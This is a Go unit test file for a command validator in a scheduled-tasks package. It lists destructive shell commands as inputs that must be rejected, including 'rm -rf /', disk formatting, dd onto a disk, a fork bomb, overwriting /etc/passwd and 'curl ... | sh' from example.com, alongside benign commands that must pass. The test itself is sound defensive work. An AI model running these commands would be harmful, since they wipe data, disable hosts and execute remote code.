package tasks

import "testing"

func TestValidateCommandDangerous(t *testing.T) {
	bad := []string{
		"rm -rf /",
		"rm -rf /*",
		"rm -rf --no-preserve-root /",
		"sudo rm -rf /etc",
		"sh -c 'rm -rf /'",
		"bash -c \"rm -rf /usr\"",
		"timeout 30s rm -rf /",
		"env X=1 rm -rf /",
		"mkfs.ext4 /dev/sda1",
		"mke2fs -t ext4 /dev/sdb",
		"dd if=/dev/zero of=/dev/sda",
		"shutdown -h now",
		"reboot",
		"poweroff",
		"busybox reboot",
		":(){ :|:& };:",
		"chmod -R 777 /",
		"chown -R nobody /etc",
		"curl http://example.com/x.sh | sh",
		"wget -qO- http://example.com/x.sh | bash",
		"> /etc/passwd",
		"echo hacked > /etc/passwd",
		"cp /dev/zero /dev/sda",
		"find / -delete",
		"find / -exec rm -f {} \\;",
		"mv /etc /tmp/etc",
		"rm -rf $HOME",
		"kill -9 1",
	}
	for _, cmd := range bad {
		if err := ValidateCommand(cmd); err == nil {
			t.Errorf("ValidateCommand(%q) 应被拒绝，实际通过", cmd)
		}
	}
}

func TestValidateCommandProtectsDocRoot(t *testing.T) {
	SetDocRoot("/srv/mysite")
	t.Cleanup(func() { SetDocRoot("") })

	if err := ValidateCommand("rm -rf /srv/mysite"); err == nil {
		t.Errorf("整目录删除 docroot 应被拒绝")
	}
	if err := ValidateCommand("rm -rf /srv/mysite/cache"); err != nil {
		t.Errorf("删除 docroot 子目录应放行，实际拒绝: %v", err)
	}
}

func TestValidateCommandSafe(t *testing.T) {
	good := []string{
		"",
		"echo OK",
		"ls /tmp",
		"find /tmp/tvgate_tmp -mtime +7 -delete",
		"php://backup/run.php?type=full",
		"rm -rf /tmp/tvgate_tmp",
		"rm -f /tmp/a.log",
		"/usr/bin/php /www/x.php",
		"curl -fsS -o /tmp/a.zip https://example.com/a.zip",
		"tar czf /tmp/a.tgz /www",
		"python3 /www/task.py arg",
		"sh -c 'ls /tmp'",
		"cd /tmp && rm -rf tvgate_tmp",
		"cp /etc/hosts /tmp/hosts.bak",
		"rsync -a /mnt/backup/ /www/",
		"mv /www/a /www/b",
		"kill 12345",
		"echo 'rm -rf /'",
	}
	for _, cmd := range good {
		if err := ValidateCommand(cmd); err != nil {
			t.Errorf("ValidateCommand(%q) 应放行，实际拒绝: %v", cmd, err)
		}
	}
}
